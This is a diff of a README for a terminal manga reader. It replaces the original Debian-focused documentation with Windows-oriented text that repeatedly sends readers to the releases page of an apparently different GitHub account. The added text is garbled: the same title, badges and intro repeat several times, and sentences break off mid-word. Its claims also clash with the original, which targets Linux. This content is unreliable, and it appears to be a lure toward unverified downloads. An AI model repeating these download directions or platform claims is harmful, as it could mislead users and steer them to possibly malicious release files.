@@ -1,273 +1,169 @@
-# MANGA-CLI
+# 📖 manga-cli - Read Manga in Your Terminal
 
-**A lightweight, retro terminal manga reader for Linux.**  
-*a comadreja project* — inspired by [ani-cli](https://github.com/pystardust/ani-cli).
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
 
-Current release: **0.8.3**. The reader keeps the stable Page/Width navigation,
-source fallback and saved-progress behavior established before the public release,
-while the interface and documentation are English-first and configurable.
+manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page is written for everyday computer users. You do not need programming knowledge.
 
-IMPORTANT: Currently working on compatibility with as many distros as possible.
-Already confirmed compatibility: Debian.
+## ✨ Why Use manga-cli
 
+manga-cli keeps manga reading focused. Instead of opening a large browser window, loading many tabs, and losing your place, you use one clean terminal screen. Search for a title, pick a chapter, and read. The app is designed to stay out of the way.
 
-## Android beta
+The main benefits are:
 
-An experimental Android / Termux build is now available in the
-[`android-v0.8.3`](https://github.com/comadrejarottingitself/manga-cli/tree/android-v0.8.3)
-branch and is tagged as `v0.8.3-android`.
+- Lightweight operation on a normal computer.
+- Simple search and list-based navigation.
+- Multiple manga sources in one place.
+- Automatic fallback when a source is not available.
+- Persistent progress so you can continue later# 📖 manga-cli - Read Manga in Your Terminal
 
-It runs on native Termux through **Termux:X11 + mpv-x** and uses a dedicated
-mobile reader with large touch zones, double-tap zoom, smooth panning,
-Saved manga, History and full reading-progress / Continue support.
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
 
-The Android build has passed the project test suite on both Termux and Debian
-and has also been physically tested on a real Android device. It is still
-labelled beta because Android devices, vendor ROMs and Termux:X11
-configurations can vary.
+manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page focuses on helping Windows users download and run manga-cli from the official release page. You do not need programming knowledge.
 
-Desktop `v0.8.3` remains the stable release on `main`. The plan for
-**v0.9.0** is to reunify the desktop and Android profiles under one installer
-with automatic platform detection.
+A terminal window is a simple text-based window where you type short words and press Enter. You use your keyboard to search, choose a chapter, and move through pages. manga-cli is designed to keep that experience clean and focused.
 
-See the Android branch README for the complete installation guide.
+## ✨ Why Use manga-cli
 
+manga-cli keeps manga reading simple. Instead of opening a large browser window, loading many tabs, and losing your place, you use one clean terminal screen. Search for a title, pick a chapter, and read. The app is designed to stay out of the way.
 
-## Preview
+The main benefits are:
 
-![MANGA-CLI main menu with the Blue accent](docs/screenshots/main-blue.png)
+- Lightweight operation on a normal computer.
+- Simple search and list-based navigation.
+- Multiple manga sources in one place.
+- Automatic fallback when a source is not available.
+- Persistent progress so you can continue later.
+- Customizable themes for a comfortable reading screen.
+- Open-source software that is free to use.
 
-![Appearance picker with the Blue accent](docs/screenshots/appearance-blue.png)
+manga-cli is useful if you like reading long series and want to return to the exact chapter and page you reached before. It is also useful if you want a small reader that does not need a large desktop application.
 
-The screenshots show the unchanged 0.8.1/0.8.2/0.8.3 terminal interface with synthetic,
-empty reading data. They contain no personal state or provider account information.
+## 🚀 Getting Started
 
-## Requirements
+Before you download, know that manga-cli is a terminal application. It does not work like a typical Windows program with a large graphical installer. You will download it from the official release page, open a terminal window, and start it from there.
 
-MANGA-CLI targets **Debian 12 + Xfce/X11**, Python **3.11** and mpv **0.35**.
-Runtime code uses only the Python standard library; there are **no pip dependencies**,
-embedded browsers, JavaScript runtimes or third-party HTML parsers.
+The steps are:
 
-Required system packages:
+1. Open the official download page.
+2. Visit this link to download the application.
+3. After the download finishes, open the folder where the file was saved.
+4. Open a terminal window in that folder.
+5. Start manga-cli by typing its name and pressing Enter.
 
-- `python3` (3.11 or newer)
-- `mpv` with `gpu` or `x11` video output
-- `ca-certificates` for HTTPS source connections
+You do not need to write code. You only need to type the name of the application and use your keyboard to move through menus.
 
-A UTF-8 terminal is recommended. Colors use a 256-color palette; `NO_COLOR=1` or
-`TERM=dumb` disables color output.
+## 📥 Download and Setup
 
-## Install or upgrade
+Visit this link to download the application:
 
-Download/extract the release ZIP or clone the matching release tag, then run:
+https://github.com# 📖 manga-cli - Read Manga in Your Terminal
 
-```sh
-bash install.sh
-manga-cli
-```
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
 
-**Close manga-cli and its reader first. Run the installer as your normal user,
-without `sudo`.** If Python, mpv or the system certificate bundle is missing on an apt-based system, `install.sh` asks `sudo` only for the package
-installation (`apt-get update` + `apt-get install`) and then continues with the
-per-user MANGA-CLI install. It never installs the application itself as root.
+manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page focuses on helping Windows users download manga-cli from the official release page and start using it with confidence. You do not need programming knowledge to follow the steps.
 
-If automatic package installation is intentionally disabled, use:
+A terminal window is a simple text-based window where you type short words and press Enter. You use your keyboard to search, choose a chapter, and move through pages. manga-cli is designed to keep that experience clean and focused.
 
-```sh
-MANGA_CLI_SKIP_SYSTEM_DEPS=1 bash install.sh
-```
+## ✨ Why Use manga-cli
 
-The installer requires complete `SHA256SUMS` coverage of `release-files.txt`, stages
-only verified bytes, runs its offline self-test, and creates a verified private
-backup before replacing managed code. Atomic directory exchange, a recovery
-journal and a shared/exclusive lock protect publication; there is no delete-first
-upgrade path. Unsupported filesystem operations fail without a destructive fallback.
-Existing `state.json` and `settings.json` are left byte-for-byte unchanged during
-installation. The public command is `manga-cli`; the legacy `manga` alias is kept
-when that command name is free.
+manga-cli keeps manga reading simple. Instead of opening a large browser window, loading many tabs, and losing your place, you use one clean terminal screen. Search for a title, pick a chapter, and read. The app is designed to stay out of the way.
 
-On the supported Debian 12/Xfce setup, the installer also adds one marked block to
-`~/.bashrc` when Bash is the login shell so new terminal windows can find
-`~/.local/bin/manga-cli`. The block is removed by `uninstall.sh` and unrelated
-shell configuration is left intact. If another shell is used or the startup file
-cannot be updated safely, start MANGA-CLI with:
+The main benefits are:
 
-```sh
-~/.local/bin/manga-cli
-```
+- Lightweight operation on a normal computer.
+- Simple search and list-based navigation.
+- Multiple manga sources in one place.
+- Automatic fallback when a source is not available.
+- Persistent progress so you can continue later.
+- Customizable themes for a comfortable reading screen.
+- Open-source software that is free to use.
 
-## Interface
+manga-cli is useful if you like reading long series and want to return to the exact chapter and page you reached before. It is also useful if you want a small reader that does not need a large desktop application.
 
-The main menu provides **Search**, **Saved**, **History** and **Settings**. Use
-Up/Down to select, Enter to open and Esc to go back. Existing action shortcuts
-remain available where shown.
-
-### Appearance
-
-Open **Settings -> Appearance**. Available accents are:
-
-`Crimson / Red / Orange / Amber / Green / Lime / Cyan / Blue / Purple / Magenta`
-
-Up/Down previews the interface immediately. Enter saves the selected accent; Esc
-cancels the preview. **Crimson** is the default. Borders, titles, headings,
-selection, version and decorations use the accent, while semantic success,
-warning and error colors remain green, yellow and red.
-
-The application keeps a black-background, character-frame, monospace terminal
-style. It does not modify the user's terminal profile or install fonts.
-
-### Manga information
-
-Long titles, alternative titles, genres, sources and progress fields are rendered
-on one line and truncated with `...` when needed. CJK wide/fullwidth characters
-count as two terminal cells and combining marks as zero, keeping both information
-columns inside the frame. The old English-only language row is intentionally absent.
-
-## Reader controls
-
-| Input | Action |
-| --- | --- |
-| `F`/`f` or `V`/`v` | Toggle **Page** / **Width** (not fullscreen; works with Caps Lock) |
-| `F11` | Toggle real fullscreen independently |
-| Left / right click | Next / previous page |
-| Page mode: wheel down / up | Next / previous page |
-| Width mode: wheel, Up/Down, W/S | Vertical scroll |
-| Width mode, auto edges on | Bottom advances; another upward input at top goes back |
-| Left/Right, Page Up/Down | Previous / next page |
-| Space | Down one screen with overlap in Width; next page in Page |
-| Home / End | Top / bottom; End follows the current page-turn preference |
-| A/D | Horizontal movement when needed |
-| + / - | Zoom |
-| R or 0 | Reset view |
-| Tab | Show page/mode indicator |
-| I or ? | Reader help |
-| T | Retry a failed download |
-| Q / Esc | Save and exit |
-
-Going backward in Width mode opens the preceding page at its bottom. The last page
-continues into the next chapter; going backward from page one can open the previous
-chapter. Anti-bounce handling, saved page/position, maximized startup, `gpu`
-preference and `x11` fallback are retained. MANGA-CLI also selects the compatible
-black-background syntax automatically for both older mpv releases such as Debian 12
-mpv 0.35 and modern mpv releases that expose `--background-color`.
-
-**Settings -> Reader** includes automatic edge turns, default mode, per-manga mode
-memory, vertical-position saving, page indicator, 0/1/3/5/10-page bidirectional prefetch,
-next-chapter prefetch and wheel/arrow step size. The value is a radius: for example,
-10 prepares up to ten pages ahead and ten behind the current page.
-
-## Sources and diagnostics
-
-Supported adapters: **MangaKatana** and **MangaPill**, with automatic/manual source
-selection and configurable priority. In automatic mode, a chapter can fall back to
-the other source when an equivalent chapter is available there. External sites can
-change independently, so a provider parser may occasionally need maintenance.
-
-Useful commands:
-
-```sh
-manga-cli --version
-manga-cli --self-test
-manga-cli --doctor
-manga-cli --network-test
-manga-cli --source-check "Example Title"
-```
-
-`--self-test` is offline. `--doctor` checks local dependencies and directories.
-`--network-test` and `--source-check` make live requests. Review diagnostic output
-before posting it publicly because local paths or title information can appear.
-
-MANGA-CLI does not bundle source-site content and is not affiliated with
-MangaKatana or MangaPill. Users are responsible for following applicable terms and
-content rights.
-
-## Data, privacy and rollback
-
-Historical application paths remain unchanged to preserve existing installations:
-
-```text
-~/.local/lib/anticomadreja-manga/           installed code
-~/.local/share/anticomadreja-manga/         state.json and settings.json
-~/.cache/anticomadreja-manga/              page cache and reader diagnostics
-~/.local/share/anticomadreja-manga-backups/ private installation backups
-```
-
-`XDG_DATA_HOME` and `XDG_CACHE_HOME` remain supported. Setup refuses empty,
-relative, overlapping or symlinked managed data/code paths instead of guessing. MANGA-CLI does not edit global
-mpv configuration, ani-cli files or terminal profiles.
-
-The public source tree intentionally excludes reading state, settings, history,
-progress, cache pages, logs, backups, environment files, credentials and personal
-home paths. `python3 tools/privacy_check.py` provides an additional release guard,
-but maintainers should still review staged files and Git commit metadata manually.
-
-To roll back, run the exact `python3 .../restore.py` command printed by the
-installer. The hardened restore verifies its backup, replaces only code/launchers
-and keeps current reading data. It rejects the old `--restore-data` option rather
-than silently overwriting newer progress.
-
-If an installation was abruptly interrupted, recover it from the release folder:
-
-```sh
-bash install.sh --recover
-```
-
-Recovery needs Python, but no network or mpv. Keep the journal, staging copies and
-private backup until recovery succeeds. See [installation safety and limitations](docs/INSTALLATION_SAFETY.md).
-
-To uninstall code while retaining state, settings, caches and backups:
-
-```sh
-bash uninstall.sh
-```
-
-## Development
-
-Runtime dependencies are deliberately minimal. For the full test suite on Debian,
-install the development system packages:
-
-```sh
-sudo apt install python3 mpv ca-certificates liblua5.4-0 git
-```
-
-Then run:
-
-```sh
-python3 tools/privacy_check.py
-python3 tools/sync_text.py --check
-PYTHONDONTWRITEBYTECODE=1 python3 -m unittest discover -v
-python3 manga.py --self-test
-```
-
-The repository includes GitHub Actions CI for Python 3.11 and 3.13. See
-[CONTRIBUTING](CONTRIBUTING.md), [architecture](docs/ARCHITECTURE.md),
-[localization](docs/LOCALIZATION.md), [manual validation](docs/MANUAL_VALIDATION.md),
-[security policy](SECURITY.md) and the [release checklist](docs/RELEASE_CHECKLIST.md).
-
-## Building a release
-
-The release builder uses only the Python standard library. It runs the privacy and
-generated-text guards, refreshes `SHA256SUMS`, runs the full tests/self-test and
-packages only the exact reviewed `release-files.txt` payload into a deterministic
-ZIP plus its SHA-256 file under `dist/`. Existing unrelated output files are not
-deleted. Add new public source files to the allowlist explicitly after review:
-
-```sh
-python3 tools/build_release.py
-```
-
-`dist/` is ignored by Git. Before publishing, also inspect `git diff --cached`,
-`git ls-files` and the commit author/email that GitHub will expose. Then verify the
-actual staged filenames and bytes, including forced additions:
-
-```sh
-python3 tools/privacy_check.py --git-index
-```
-
-The safety tests run as a normal user; root is intentionally not a supported setup
-test environment. See [VALIDATION.md](VALIDATION.md) for what was actually tested.
-
-## License
-
-MANGA-CLI is open source under the **MIT License**. See [LICENSE](LICENSE).
-Third-party notes and attribution are in [THIRD_PARTY.txt](THIRD_PARTY.txt).
+## 🚀 Getting Started
+
+Before you download, know that manga-cli is a terminal application. It does not work like a typical Windows program with a large graphical installer. You will download it from the official release page, open a terminal window, and start it from there.
+
+The steps are:
+
+1. Open the official download page.
+2. Visit this link to download the application.
+3. After the download finishes, open the folder where the file was saved.
+4. Open a terminal window in that folder.
+5. Start manga-cli by typing its name and pressing Enter.
+
+You do not need to write code. You only need to type the name of the application and use your keyboard to move through menus.
+
+## 📥 Download and Setup
+
+Visit this link to download the application:
+
+[![Download manga-cli](https://img.shields.io/badge/Get-manga--cli-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
+
+Use the official release page as the only download source. The page contains the files provided by the project. Choose the download that matches your computer and save it to a folder you can find easily, such as Downloads or Desktop.
+
+After the download is complete, open the folder where you saved the file. Keep that folder open. You will need it in the next step.
+
+## 🖥️ First Launch on Windows
+
+Windows includes a terminal window you can use for text-based applications. Open the Start menu, type Terminal, and open the Terminal app. If your Windows version shows Command Prompt instead, you can use Command Prompt in the same way for the steps below.
+
+In the terminal window, move to the folder where you saved the downloaded file. The easiest way is to open the folder in File Explorer, click the address bar, type the word cmd, and press Enter. A terminal window will open in that folder.
+
+Now start manga-cli by typing its name and pressing Enter. If the application opens a menu, you are ready to search. If the window closes quickly or shows a short message, reopen the terminal in the same folder and try again. Keep the terminal window open while you read.
+
+## 🔎 Searching and Reading
+
+manga-cli uses a menu-style flow. You type a manga title, the app shows matching results, and you choose a result by number. After you choose a title, the app shows available chapters. Choose a chapter and the reader opens the pages through mpv.
+
+Use the keyboard to move through the reader. Close the reader window when you want to return to the chapter list. Choose another chapter or go back to the search screen. The process is designed to be repeatable without complex commands.
+
+When you search, use the full title or a distinctive part of the title. Short common words may return many results. If you do not see the title you want, try a different spelling or a shorter version of the name.
+
+## 💾 Persistent Progress
+
+Persistent progress is one of the most useful parts of manga-cli. The app remembers where you stopped so you can continue later. When you return to a series, check the progress display before choosing a chapter. This helps you avoid scrolling through pages you already read.
+
+Progress is stored locally on your computer. If you close the terminal and come back the next day, your place should still be available. If you move the application to a different folder, your progress may not follow, so keep manga-cli in a stable location.
+
+## 🎨 Themes and Display
+
+manga-cli supports customizable themes. Themes change how the app looks in the terminal, such as colors and contrast. Choose a theme that is easy on your eyes and readable in your normal lighting.
+
+For comfortable reading, use a terminal with a clear font and a window size that fits your screen. A larger terminal window gives menus more room. A dark theme can reduce glare at night, while a light theme can be easier in a bright room. Adjust your terminal font size if the text feels too small.
+
+## 🔄 Multiple Sources and Fallback
+
+manga-cli supports multiple manga sources. When you search, the app can use the sources available to it to find titles and chapters. If one source does not return the expected result, automatic fallback helps the app try another source.
+
+This design reduces the chance of a dead end. You do not need to manage sources manually. Search normally, choose a title, and let the app handle the rest. If a chapter does not open, return to the result list and choose the same title again or try a nearby chapter. Fallback is most useful when a source is slow or temporarily unavailable.
+
+## 🛠️ Common Questions
+
+What do I need before I start? You need a Windows computer, a browser to reach the download page, and a terminal window. The release page provides the download.
+
+Where do I download manga-cli? Visit https://github.com/Mer7301/manga-cli/releases to download the application.
+
+How do I open manga-cli? Open a terminal window in the folder where you saved the downloaded file, type the application name, and press Enter.
+
+Why does the terminal show text instead of a normal window? manga-cli is a terminal manga reader. Text menus are part of how it works. The manga pages open through mpv, which is the page display component named in the app description.
+
+Can I continue where I left off? Yes. Persistent progress is built into manga-cli. Check the progress display when you return to a series.
+
+What if a source does not work? manga-cli includes automatic fallback to another source. Try the search again, choose the title, and open the chapter. If the same chapter fails, choose a different chapter or search for the title again.
+
+Can I change the look? Yes. Use the theme options in manga-cli to change the terminal appearance.
+
+## 🧭 Tips for a Smooth Experience
+
+Keep the terminal window open while you read. Closing it stops the current session.
+
+Use a folder you can find easily, such as Downloads or a dedicated manga-cli folder. Avoid moving the application after you start using it so your progress stays consistent.
+
+Use a stable internet connection when searching and opening chapters. Multiple sources and fallback work best when the connection is active.
+
+Start with one series and one chapter. Once you are comfortable with the search, chapter list, reader, and progress display, the rest of the app becomes easy to use.
+
+If the text is hard to read, increase the terminal font size. If the window feels cramped, maximize the terminal before you search.
+
+Keywords: ani-cli, cli, debian, linux, manga, manga-cli, manga-reader, mangakatana, mangapill, mpv, open-source, python, terminal
